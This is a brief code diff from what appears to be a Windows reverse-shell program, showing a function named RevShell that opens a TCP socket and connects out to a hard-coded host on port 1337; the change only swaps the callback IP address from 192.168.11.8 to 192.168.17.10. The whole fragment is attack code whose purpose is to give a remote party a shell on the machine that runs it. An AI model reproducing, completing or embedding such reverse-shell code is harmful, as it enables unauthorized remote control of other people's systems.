@@ -19,7 +19,7 @@ void RevShell()
     SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = inet_addr("192.168.11.8");
+    addr.sin_addr.s_addr = inet_addr("192.168.17.10");
     addr.sin_port = htons(1337);
 
     if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
